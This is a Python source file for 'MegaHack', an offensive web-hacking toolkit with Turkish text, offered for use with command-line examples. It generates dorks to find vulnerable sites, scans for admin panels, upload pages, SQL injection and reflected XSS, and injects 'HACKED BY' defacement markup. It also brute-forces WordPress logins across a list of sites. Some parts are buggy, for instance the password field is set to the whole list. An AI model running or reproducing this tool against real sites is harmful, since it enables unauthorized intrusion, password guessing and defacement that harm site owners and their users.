# CODER BY KİNG KONG#
import subprocess as sp
import requests
import random
import sys
from Scripts.kelimelistesi import *
from Scripts.sqldorkkelimelistesi import *
import mechanicalsoup
from Scripts.bruteforcewordlist import *

sp.call('cls', shell=True)
print("C O D E R: K İ N G K O N G"
      "\nİnstagram:Esatbey35")
print("\nParametreler:\n\n"
      "-u:  Hedef Site\n"
      "-a:  Admin Panel Tarama\n"
      "-d:  Dizin Tarama\n"
      "-x:  XSS Açıklı Site Hack\n"
      "-D:  Dork Üretme\n"
      "-s:  SQL Scanner\n"
      "-X:  XSS Scanner\n"
      "-b:  Wordpress Bruteforce Atağı\n"
      "-h:  Program Hakkında Yardım\n"
      "-v:  Program Bilgileri\n"
      "-p:  Parametrelerin Kullanımları\n"
      "\nÖRNEK:py -3 MegaHack.py -u http://www.hedefsite.com -parametre\n")


def yardim():
    print("-u: Hedef Siteyi Belirlemeniz İçin Gerekli Parametre.\n")
    print("-a: Hedef Sitede Admin Panellerini Tarar.\n")
    print("-d: Hedef Sitedeki Dizinleri Tarar.\n")
    print("-x: Sitedeki XSS Açığından Yararlanıp Siteyi Hackler.\n")
    print("-D: Dork Üretir.\n")
    print("-s: Hedef Sitedeki SQL Açığını Tarar.\n")
    print("-X: Hedef Sitedeki XSS Açığını Tarar.\n")
    print("-b: Siteler.txt'deki Wordpress Sitelere Bruteforce Atağı Yapar.\n")
    print("-v: Programın Bilgilerini Verir.")


def parametlerinkullanimlari():
    print("\n||||||||||||||Parametrelerin Kullanımları||||||||||||||\n")
    print('\npy -3 "MegaHack.py" -u http://www.hedefsite.com -a \n')
    print('py -3 "MegaHack.py" -u http://www.hedefsite.com -d \n')
    print('py -3 "MegaHack.py" -u http://www.hedefsite.com/sayfa.php?id= -x\n')
    print('py -3 "MegaHack.py" -D\n')
    print('py -3 "MegaHack.py" -u http://www.hedefsite.com -s\n')
    print('py -3 "MegaHack.py" -u http://www.hedefsite.com -X\n')
    print('py -3 "MegaHack.py" -b\n')
    print('py -3 "MegaHack.py" -h\n')
    print('py -3 "MegaHack.py" -v\n')


def wordpressbruteforce():
    soru = input("Default Şifrelerlemi Denemek İstiyorsunuz: E\H ")
    yeniliste = []
    if soru == "E" or soru == "e":
        siteler = []
        oku = open("siteler.txt", "r")
        sitelerioku = oku.readlines()
        for websiteleri in sitelerioku:
            siteler.append(websiteleri.replace("\n", "") + "wp-login.php")
        print("Siteler Ekleniyor...\n")
        print("Bütün Siteler Eklendi!\n")
        for x in siteler:
            for i in sifreler:
                try:
                    browser = mechanicalsoup.StatefulBrowser()
                    browser.open(x)
                    browser.select_form('form[name="loginform"]')
                    browser["log"] = kadi
                    browser["pwd"] = sifreler
                    response = browser.submit_selected()
                    if "Dashboard" in response.text or "dashboard" in response.text:
                        print("Giriş Başarılı:", x + ":" + "admin" + ":" + i)
                        yeniliste.append(x)
                        siteler.remove(x)

                    else:
                        print("Hatalı Şifre!", x)
                        continue

                except:
                    continue
        for girisyapilanlardef in yeniliste:
            print("Giriş Yapılanlar: ", girisyapilanlardef)
    elif soru == "H" or soru == "h":
        siteler = []
        oku = open("siteler.txt", "r")
        sitelerioku = oku.readlines()
        sifrelerr = []
        dizin = input("Şifrelerin Olduğu Dizini Giriniz: ")
        okuu = open(dizin, "r")
        okumak = okuu.readlines()
        for i in okumak:
            sifrelerr.append(i.replace("\n", ""))
        print(sifrelerr)
        for websiteleri in sitelerioku:
            siteler.append(websiteleri.replace("\n", "") + "wp-login.php")
        print("\nSiteler Ekleniyor...\n")
        print("Bütün Siteler Eklendi!\n")
        for x in siteler:
            for i in sifrelerr:
                try:
                    browser = mechanicalsoup.StatefulBrowser()
                    browser.open(x)
                    browser.select_form('form[name="loginform"]')
                    browser["log"] = kadi
                    browser["pwd"] = sifrelerr
                    response = browser.submit_selected()
                    if "Dashboard" in response.text or "dashboard" in response.text:
                        print("Giriş Başarılı:", x + ":" + "admin" + ":" + i)
                        yeniliste.append(x)
                        siteler.remove(x)

                    else:
                        print("Hatalı Şifre!", x, i)
                        continue
                except:
                    continue
        for girisyapilanlar in yeniliste:
            print("Giriş Yapılanlar:", girisyapilanlar)


def uploadacigibulucu():
    dorklar = ['/admin/upload.php', '/upload.php', '/file-upload.php', '/upload/upload.php']
    r = requests.get(site)
    if r.status_code == 200:
        print("Açık Taranmaya Başladı!")
    else:
        print("Siteye Bağlanılamıyor Lütfen URL'i Kontrol Ediniz.")
    for i in dorklar:

        yeni = r.url + i
        hedef = requests.get(yeni, timeout=5)
        if hedef.status_code == 200:
            print("Açık Bulundu!", "[+]" + hedef.url)
        else:
            print("Açık Bulunamadı!")


# ADMİN PANEL BULUCU#
def adminpanelbulucu():
    dosya = open('Uzantılar.txt', 'r')
    islemsirasi = 0
    sayi = 293
    while (islemsirasi < sayi):
        islemsirasi += 1
        r = requests.get(site)

        for i in dosya:
            hedef = site + "/" + dosya.readline()
            r = requests.get(hedef)

            if r.status_code == 200:
                print("Admin Panel Bulundu:" + "\n[+]" + hedef)

        if islemsirasi == sayi:
            print("\nAdmin Panel Tarama İşlemi Bitti.")
            exit()


# ADMİN PANEL BULUCU#



# DİZİN TARAYICI#
def dizintarayici():
    r = requests.get(site + "/robots.txt")
    if r.status_code == 200:
        print("\n[+]Bulundu!", "\n" + site + "/robots.txt""\n")

    r = requests.get(site + "/sitemap.xml")
    if r.status_code == 200:
        print("\n[+]Bulundu:", "\n" + site + "/sitemap.xml""\n")

    sec = input("Kelime İlemi ID Değeri İlemi Taransın K/I: ")
    if sec == "I" or sec == "ı" or sec == "i":
        aranilacaksayi = int(input("Id degeri Kaca Kadar Aransin: "))
        id_deger = 0
        while (id_deger < aranilacaksayi):
            id_deger += 1
            r = requests.get(site,
                             params={'id': id_deger})
            if r.status_code == 200:
                print("Bulundu!" + "\n[+]" + r.url)
            elif r.status_code == 400:
                print("Bulunamadı :(")

    if sec == "K" or sec == "k":
        kelime = input("Bir Kelime Giriniz(""Sadece Kelimeyi Yazın .php Eklemeyin. ): ")
        id_deger = 0
        iddegersec = int(input("Id Değeri Kaça Kadar Sürsün Örnek:100\n"))
        while (id_deger != iddegersec):

            id_deger += 1
            r = requests.get(site + "/" + kelime + ".php",
                             params={'id': id_deger})

            if id_deger == iddegersec:

                print("İşlem Bukadar...")

                break
            elif r.status_code == 200:
                print("Bulundu!" + "\n[+]" + r.url)
            elif r.status_code == 400:
                print("Bulunamadı :(")


# DİZİN TARAYICI#


# XSS HACK#
def XSSHack():
    nick = input("Nick'inizi Giriniz: ")
    hedef = site + "<marquee>HACKED BY " + nick + "</marquee>"
    try:

        r = requests.get(hedef)
        if r.status_code == 200:
            print("\nXss Başarılı Site URL: " + hedef)
            print("\nSitenin Hacklenmiş Hali Ekranda Şu Şekilde: HACKED BY " + nick)
    except:
        print("URL Yanlış Yada Böyle Bir Site Yok.\n")
    Soruu = input("\nBir Site İle Daha Yapmak İstiyormusunuz E/H: ")
    if Soruu == "E":
        while (True):
            XSSHack()
    elif Soruu == "H":
        print("Çıkılıyor...")
        exit()


# XSS HACK#

# DORKÜRETİCİ#
def Dorkuretici():
    i = 0
    ulkeuzantisi = ""
    dorkturu = input("Hangi Dork Türü Üretkmek İstiyorsunuz Wordpress Veya SQL? W/S: ")
    uretilecekdorksayisi = int(input("Üretilecek Dork Sayısını Yazınız: "))
    ulkedorku = input("Ülke Uzantısı Eklemek İstiyormusunuz? E/H: ")

    if ulkedorku == "E" or ulkedorku == "e":
        ulkeuzantisidork = input("Ülke Uzantısı Giriniz: ")
        ulkeuzantisi = ulkeuzantisidork
        if dorkturu == "W" or dorkturu == "w":
            while (i < uretilecekdorksayisi):
                a = "wp/content/" + random.choice(dorkkelimeleri) + " " + "site:" + ulkeuzantisi
                b = "wp/admin/" + random.choice(dorkkelimeleri) + " " + "site:" + ulkeuzantisi
                print(a, "\n", b)
                i += 1
        if dorkturu == "S" or dorkturu == "s":
            while (i < uretilecekdorksayisi):
                a = "inurl:" + random.choice(dorkkelimeleri) + ".php?id=" + " " + "site:" + ulkeuzantisi
                print(a)
                i += 1

    if ulkedorku == "H" or ulkedorku == "h":
        print("")
        if dorkturu == "W" or dorkturu == "w":
            while (i < uretilecekdorksayisi):
                a = "wp/content/" + random.choice(dorkkelimeleri)
                b = "wp/admin/" + random.choice(dorkkelimeleri)
                print(a, "\n", b)
                i += 1
        if dorkturu == "S" or dorkturu == "s":
            while (i < uretilecekdorksayisi):
                a = "inurl:" + random.choice(dorkkelimeleri) + ".php?id="
                print(a)
                i += 1


# DORKÜRETİCİ#


# SQL SCANNER#
def SQLAcikTarayici():
    i = 0
    while i < 1:

        i += 1
        r = requests.get(site, timeout=5)
        if r.status_code == 200:
            print("Açık Taranmaya Başladı!")
        else:
            print("Siteye Bağlanılamıyor Lütfen URL'i Kontrol Ediniz.")

        if ".php?id=" in site:
            yeni = r.url + "'"
            hedef = requests.get(yeni, timeout=5)
            htmlkodlari = hedef.text
            if "SQL syntax;" in htmlkodlari:
                print("SQL Açığı Bulundu:" + "\n[+]" + hedef.url)

            elif "mysql_fetch_array()" in htmlkodlari:
                print("SQL Açığı Bulundu: " + "\n[+]" + hedef.url)

            elif "mysql_fetch_array()" not in htmlkodlari:
                print("Açık Bulunamadı:" + "\n[-]" + hedef.url)
                exit()
            if hedef.status_code == 400:
                print("Site Hatalı!")
                exit()
        else:

            for i in dorkliste:
                yeni = r.url + i + "'"
                hedef = requests.get(yeni, timeout=5)
                htmlkodlari = hedef.text
                if "SQL syntax;" in htmlkodlari:
                    print("SQL Açığı Bulundu:" + "\n[+]" + hedef.url)

                elif "mysql_fetch_array()" in htmlkodlari:
                    print("SQL Açığı Bulundu: " + "\n[+]" + hedef.url)
                elif "mysql_fetch_array()" not in htmlkodlari:
                    print("\nAçık Bulunamadı: " + hedef.url)

                if hedef.status_code == 400:
                    print("Site Hatalı!")
                    exit()


# SQL SCANNER#

# XSS SCANNER#
def XSSAcikTarayici():
    r = requests.get(site, timeout=5)
    i = 0
    while i < 1:
        i += 1
        if r.status_code == 200:
            print("Sitede XSS Açığı Taranmaya Başlandı!\n")
        else:
            print("Siteye Bağlanılamıyor Lütfen URL'i Kontrol Ediniz.")
    if ".php?id=" in site:
        yeni = r.url + "HACKED BY NICK"
        hedef = requests.get(yeni, timeout=5)
        htmlkodlari = hedef.text
        if "HACKED BY NICK" in htmlkodlari:
            print("XSS Açığı Bulundu: " + "\n[+]" + hedef.url)
        elif "BY NICK" in htmlkodlari:
            print("XSS Açığı Bulundu: " + "\n[+]" + hedef.url)
        elif "HACKED BY" in htmlkodlari:
            print("XSS Açığı Bulundu: " + "\n[+]" + hedef.url)

        else:
            print("\nXSS Açığı Bulunamadı: " + hedef.url)
    else:

        for i in dorkliste:
            yeni = r.url + i + "HACKED BY NICK"
            hedef = requests.get(yeni, timeout=5)
            htmlkodlari = hedef.text
            if "HACKED BY NICK" in htmlkodlari:
                print("XSS Açığı Bulundu: " + "\n[+]" + hedef.url)
            elif "BY NICK" in htmlkodlari:
                print("XSS Açığı Bulundu: " + "\n[+]" + hedef.url)
            elif "HACKED BY" in htmlkodlari:
                print("XSS Açığı Bulundu: " + "\n[+]" + hedef.url)

            else:
                print("\nXSS Açığı Bulunamadı: " + hedef.url)


# XSS SCANNER#

def ProgramBilgileri():
    print("Program Adı: MegaHack")
    print("Versiyon: 3.0")
    print("Kodlayan: King Kong")
    print("Sorularınız İçin İnstagram Adresim: Esatbey35")
    print("İyi Kullanımlar ^_^")


if len(sys.argv) < 2:
    exit()

elif sys.argv[1] in "-u" and sys.argv[3] in "-X":
    site = sys.argv[2]
    sp.call('cls', shell=True)
    sp.call('color a',shell=True)
    print("MegaHack.py->>>\n")
    XSSAcikTarayici()

elif sys.argv[1] in "-u" and sys.argv[3] in "-s":
    site = sys.argv[2]
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    SQLAcikTarayici()

elif sys.argv[1] in "-D":
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    Dorkuretici()

elif sys.argv[1] in "-u" and sys.argv[3] in "-x":
    site = sys.argv[2]
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    XSSHack()

elif sys.argv[1] in "-u" and sys.argv[3] in "-d":
    site = sys.argv[2]
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    dizintarayici()


elif sys.argv[1] in "-u" and sys.argv[3] in "-a":
    site = sys.argv[2]
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    adminpanelbulucu()
elif sys.argv[1] in "-v":
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    ProgramBilgileri()
elif sys.argv[1] in "-u" and sys.argv[3] in "-U":
    site = sys.argv[2]
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    uploadacigibulucu()
elif sys.argv[1] in "-b":
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    wordpressbruteforce()
elif sys.argv[1] in "-h":
    sp.call('cls', shell=True)
    sp.call('color a', shell=True)
    print("MegaHack.py->>>\n")
    yardim()
elif sys.argv[1] in "-p":
    sp.call('cls', shell=True)
    sp.call('color a',shell=True)
    print("MegaHack.py->>>\n")
    parametlerinkullanimlari()

else:
    mesaj = "Girdiğiniz Parametre Yanlış Veya Hatalı."
    print(mesaj)
    exit()